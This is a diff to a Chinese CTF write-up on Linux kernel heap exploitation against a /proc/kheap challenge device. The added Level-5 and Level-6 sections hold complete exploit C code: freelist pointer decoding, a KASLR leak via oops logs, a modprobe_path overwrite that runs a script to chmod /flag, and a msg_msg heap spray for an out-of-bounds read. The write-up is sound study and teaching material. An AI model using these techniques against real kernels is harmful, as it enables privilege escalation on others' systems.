@@ -628,7 +628,7 @@ int main() {
 
 检查一个释放后的堆块，发现里面存在指向下一个空闲堆块的指针。kernel的slab管理器用单项链表管理freelist，所以直接覆盖这个指针就能拿到任意地址处的堆块了对吧？
 
-对但是不对。题目开启了randomized freelist。我以为这玩意只会“随机化slab给出的slot顺序”，事实上它还会使释放后的对象在链表的随机位置插入，而不是直接插入链表头部。这就导致我们无法像用户态tcache poisoning一样精准控制何时会拿到目标地址处的堆块。解决办法是无脑堆喷，反正总会拿到的
+对但是不对。题目开启了randomized freelist。我以为这玩意只会“随机化slab给出的slot顺序”，事实上它还会使释放后的对象在链表的随机位置插入，而不是直接插入链表头部。这就导致我们无法像用户态tcache poisoning一样精准控制何时会拿到目标地址处的堆块。解决办法是无脑堆喷，反正总会拿到的(并非如此，见下方`Level-5`)
 
 需要找个方法泄漏地址从而绕过kaslr。我想的办法是，先用uaf篡改一个堆块的链表指针指向原地址减去0x10的地方，然后再覆盖某个堆结构的函数指针为任意一个无效的地址。最后ioctl调用函数指针，利用kernel oops的日志内容泄漏地址。幸运的是，题目环境没开panic on oops，所以oops不会让整个kernel崩溃重启；而且打印出来的寄存器信息中r10的值正好是一个kernel内的地址。先放出这一阶段的脚本：
 ```c
@@ -982,6 +982,264 @@ int main() {
     }
     for(int i=0;i<victim_count;i++){
         close(victimFds[i]);
+    }
+    return 0;
+}
+```
+### Level-5
+
+我去我之前的理解都是错的
+
+之前在`Level-3`写过这段话：
+```
+...它还会使释放后的对象在链表的随机位置插入，而不是直接插入链表头部。这就导致我们无法像用户态tcache poisoning一样精准控制何时会拿到目标地址处的堆块
+```
+事实上并非如此。这玩意是deepseek告诉我的（bruh一定要打开联网搜索啊），当时我看着堆块取出的顺序与我的期望不符，就想当然地认为ds是对的。这里的随机化仅在slab最初分配出来时生效，后续该怎么链入就怎么链入——插入链表头部，遵循LIFO顺序。在源码中也可以窥见一二： https://elixir.bootlin.com/linux/v6.7.9/source/mm/slub.c#L1951 。查找引用，shuffle_freelist函数在slub分配器中仅在allocate_slab函数中调用。搞明白这点后，做题思路就更明朗了
+
+HARDENED freelist类似用户态里的safe linking，将释放后的堆块的fd地址加密为`ptr^(kmem_cache->random)^swab(ptr_addr)`。其中：
+- ptr是下一个堆块的地址（分配的目标地址）
+- kmem_cache->random是每个cache中固定的随机值。随机的意思是这个值不可预测，固定的意思是这个值对于每个调用`kmem_cache_create`函数返回的kmem_cache是一样的
+- ptr_addr是当前堆块存储ptr的地址。swab用于换端序
+- 具体实现见[freelist_ptr_encode](https://elixir.bootlin.com/linux/v6.7.9/source/mm/slub.c#L374)
+
+`Kernel Heap Protections`里讲了，假如堆块A不存在下一个堆块，即ptr是null，则堆块A存储的fd是`null^random^ptr_addr`；接下来多free一个堆块B，则ptr变为B的地址，A存储的fd为`B^random^ptr_addr`。两者再异或，就能得到B的地址。好的就这么干
+```c
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <stdio.h>
+char* xor_strings(const char* str1, const char* str2) {
+    int len = 8;
+    char* result = (char*)malloc(len + 1);
+    if (!result) {
+        return NULL;
+    }
+    for (int i = 0; i < len; i++) {
+        result[i] = str1[i] ^ str2[i];
+    }
+    result[len] = '\0';
+    return result;
+}
+char* find_8byte_strings(const void *buffer, size_t buffer_size) {
+    const char *ptr = (const char *)buffer;
+    size_t num_strings = buffer_size / 8;
+    for (size_t i = 0; i < num_strings; i++) {
+        const char *current_str = ptr + (i * 8);
+        if (current_str[1] != 0) {
+            printf("Found 8-byte string at offset %zu: ", i * 8);
+            for (int j = 0; j < 8; j++) {
+                printf("%02x ", (unsigned char)current_str[j]);
+            }
+            printf("\n");
+            char *copy = (char *)malloc(8);
+            if (!copy) {
+                perror("malloc failed");
+                return NULL;
+            }
+            memcpy(copy, current_str, 8);
+            return copy;
+        }
+    }
+    return NULL;
+}
+int main() {
+    unsigned long arg[2];
+    char buf[0x1d0];
+    memset(buf,0,sizeof(buf));
+    arg[0]=(unsigned long)buf;
+    arg[1]=sizeof(buf);
+    int fd_count=8; //slabinfo中可以看到一个slab中只有8个堆块
+    int fds[fd_count];
+    for(int i=0;i<fd_count;i++){
+        fds[i]=open("/proc/kheap", O_RDWR); //全部分配完保证freelist里没东西
+    }
+    ioctl(fds[0],0x5703,arg); //调用free，fds[0]对应的堆块就是freelist里的第一个堆块，因此fd为null
+    ioctl(fds[0],0x5700,arg);
+    char* leak=find_8byte_strings(buf, sizeof(buf));
+    int victim=open("/proc/kheap", O_RDWR); //把fds[0]对应的堆块再拿回来
+    close(fds[1]); //free一个别的堆块
+    ioctl(fds[0],0x5703,arg); //再free fds[0]，此时fds[0]指向的下一个堆块是fds[1]
+    ioctl(fds[0],0x5700,arg);
+    close(fds[2]); //防止内核因为直接的double free崩溃
+    char* leak2=find_8byte_strings(buf, sizeof(buf));
+    char *pos = memmem(buf,sizeof(buf), leak2, 8);
+    char* heap_leak=xor_strings(leak,leak2); //这个地址是一个堆块的地址（然而后面发现用不到）
+    for (int i = 0; i < 8; i++) {
+        printf("%02x", (unsigned char)heap_leak[i]); 
+    }
+    printf("\n");
+    return 0;
+}
+```
+之前我没有加`close(fds[2])`，发现kernel会直接卡死，没法进行任何交互。去逛了社区后发现，kernel堆存在简易的double free检测，不能连续free一个堆块两次（但是中间插一个别的堆块可以）。假如不加这句的话，倒着看脚本，最后一个free的堆块是fds[0]（`ioctl(fds[0],0x5703,arg)`），然后内核清理时free victim（脚本末尾没有手动close打开的fd，于是内核自动按照打开顺序的倒序调用设备的release函数）。victim和fds[0]内部是一个堆块，过不了double free检测
+
+目前freelist是经典的A -> B -> A -> X结构。假如再运行这个脚本一次，第一次取出A时会清空A，导致第二个A指向的X是一个无效地址。alloc触发kernel oops。好的kaslr也解决了，还是那个熟悉的r10
+
+当然我实际做的时候并没有那么顺利。为了理解HARDENED freelist机制，我用`p *(kmem_cache->random)`查看random的值，尝试自己计算混淆后的fd值。结果发现怎么搞都不对？于是调试了一下。虽然实际汇编好像又和源码差距很大（内联优化的锅？），但我确认`kmem_cache_free+425`是加密指针的具体代码
+```
+   0xffffffff91a7e5fb <kmem_cache_free+411>    mov    rsi, qword ptr [r12 + 0xb8]
+   0xffffffff91a7e603 <kmem_cache_free+419>    mov    rdi, rcx
+   0xffffffff91a7e606 <kmem_cache_free+422>    bswap  rdi
+ ► 0xffffffff91a7e609 <kmem_cache_free+425>    xor    rsi, rax
+   0xffffffff91a7e60c <kmem_cache_free+428>    xor    rsi, rdi
+
+//加密值 0x0bcd8809ffad2ba3^bswap(0xffff894c0230f6e8)^0xffff894c0230fc00
+//当前free 0xffff894c0230f600
+//0x0bcd8809ffad2ba3是kmem_cache->random，rsi
+//0xffff894c0230f6e8是fd指针存储的位置，rdi
+//0xffff894c0230fc00是上一个free的堆块，rax
+//值存储在0xffff894c0230f6e8
+```
+然后我发现rsi的值与`p *(kmem_cache->random)`给的结果完全不一样。emmm，可能此kmem_cache非彼kmem_cache吧。参考代码，题目的kmem_cache应该在cachep里
+
+知道这个信息后，我发现dmesg报错日志里的rax和rdi很接近。考虑到这个报错出现在alloc阶段，这个rax很有可能就是准备返回的地址。那rdi是什么？不可能只是random值，因为rax和rdi的异或结果根本不是一个合法的地址（指针存储的位置），也不足8个字节（random值必然8个字节）。所以直接就是`random^ptr_addr`？那我让堆块的fd为日志里的rdi值异或modprobe的地址，是不是就能拿到modprobe了？没想到还真是这样的
+```c
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <stdio.h>
+void prepare_modprobe_files() {
+    system("echo '#!/bin/sh\nchmod 777 /flag' > /tmp/x");
+    system("chmod +x /tmp/x");
+    system("printf '\xff\xff\xff\xff' > /tmp/dummy");
+    system("chmod +x /tmp/dummy");
+}
+void u64_to_binary_string(uint64_t num, char *output) {
+    memcpy(output, &num, 8);
+}
+int main() {
+    prepare_modprobe_files();
+    unsigned long arg[2];
+    char buf[0x1d0];
+    memset(buf,0,sizeof(buf));
+    int fd_count=8;
+    int fds[fd_count];
+    arg[0]=(unsigned long)buf;
+    arg[1]=sizeof(buf);
+    char output[8];
+    uint64_t modprobe=0xffffffff84458c20+0xe68a0-0x40;
+    uint64_t modprobe_encrypted=0x582a1cc463b67040^modprobe;
+    u64_to_binary_string(modprobe_encrypted,output);
+    memcpy(buf+232,output,8);
+    for(int i=0;i<fd_count;i++){
+        fds[i]=open("/proc/kheap", O_RDWR);
+        ioctl(fds[i],0x5701,arg);
+    }
+    memset(buf, 0, sizeof(buf));
+    strcpy(buf+0x40,"/tmp/x");
+    unsigned long *ul_buf = (unsigned long *)buf;
+    int off=40;
+    ul_buf[off++]=0x0000003200000000;
+    ul_buf[off++]=modprobe+0x148;
+    ul_buf[off++]=modprobe+0x148;
+    ul_buf[off++]=0;
+    ul_buf[off++]=0;
+    ul_buf[off++]=0;
+    ul_buf[off++]=modprobe+0x170;
+    ul_buf[off++]=modprobe+0x170;
+    ul_buf[off++]=1;
+    ul_buf[off++]=0;
+    ul_buf[off++]=0;
+    ul_buf[off++]=0;
+    ul_buf[off++]=modprobe-0x48172d;
+    ul_buf[off++]=modprobe+0x220;
+    ul_buf[off++]=0x000001a400000004;
+    ul_buf[off++]=0;
+    ul_buf[off++]=modprobe-0x1a0d0a0;
+    ul_buf[off++]=0;
+    for(int i=0;i<fd_count;i++){
+        ioctl(fds[i],0x5701,arg);
+    }
+    system("/tmp/dummy");
+    system("cat /flag");
+    return 0;
+}
+```
+不过我还没有完全明白。要这么说的话，rax的值应该和rdi一样啊？因为异或了一个null。但这个结论好像又挺对的。怪事了
+
+### Level-6
+
+建议阅读`Exploiting the Kernel`后再做这题
+
+堆喷，启动！
+
+题目的保护多了个panic on oops，没法用前面的方法搞地址了。不过这题“返璞归真”，flag由设备读到了堆上。ioctl里取消了copy_to_user的功能，然而uaf仍然存在。不过使用的函数变成了kfree和kmalloc（kmalloc_trace），不存在设备额外创建的kmem_cache了。没啥说的，按照教程里介绍的内容堆喷msg_msg结构体，尝试修改`m_ts`字段的值，实现堆越界读。运气好的话可以拿到flag
+
+参考了这篇文章： https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP
+```c
+#define _GNU_SOURCE 
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
+int main() {
+    int ret;
+    int victim_count=6;
+    int victimFds[victim_count];
+    unsigned long arg[2];
+    char buf[0x1000];
+    memset(buf,0,sizeof(buf));
+    arg[0]=(unsigned long)buf;
+    arg[1]=0x30;
+    int fd=open("/proc/kheap", O_RDWR);
+    for(int i=0;i<victim_count;i++){
+        victimFds[i]=open("/proc/kheap", O_RDWR);
+    }
+    int spary_count=10;
+    int ms_qid[spary_count];
+    for (int i = 0; i < spary_count; i++)
+    {
+        ms_qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT); //msgget创建的是msg_queue结构体，不是我们的目标
+        if (ms_qid[i] < 0)
+        {
+            puts("[x] msgget!");
+            return -1;
+        }
+    }
+    ioctl(fd,0x5703,arg);
+    for (int i = 0; i < spary_count; i++)
+    {
+        memset(buf, 'A' + i, sizeof(buf));
+        ret = msgsnd(ms_qid[i], buf, 0x1d0 - 0x30, 0); //这个才是目标，msg_msg结构体。0x1d0是kheap设备分配的堆块大小，因此控制大小使msgsnd从与kheap相同的cache中分配堆块。0x30是msg_msg结构体的header大小
+        if (ret < 0)
+        {
+            puts("[x] msgsnd!");
+            return -1;
+        }
+    }
+    for(int i=0;i<victim_count;i++){
+        ioctl(victimFds[i],0x5704,arg); //读多个flag提高成功率
+    }
+    memset(buf, 0, sizeof(buf));
+    unsigned long *ul_buf = (unsigned long *)buf;
+    int offset=0;
+    ul_buf[offset++]=0xfffffe0000000500; //这个地址是什么不重要，但必须是合法的内核地址。这个知识是我之前积累的，就算打开了kaslr，这块地址也不会改变
+    ul_buf[offset++]=0xfffffe0000000500;
+    ul_buf[offset++]=0x4141414141414141; //调试得到的值
+    ul_buf[offset++]=0x1000-0x30; //修改消息的大小，一个msg_msg结构体最多占用一张内存页
+    ul_buf[offset++]=0;
+    ul_buf[offset++]=0xfffffe0000000500;
+    ioctl(fd,0x5701,arg);
+    for (int i = 0; i < spary_count; i++)
+    {
+        ret = msgrcv(ms_qid[i], buf, 0x1000 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);
+        write(1,buf,sizeof(buf));
+        if (ret < 0)
+        {
+            printf("[x] msgrcv!");
+            return -1;
+        }
     }
     return 0;
 }
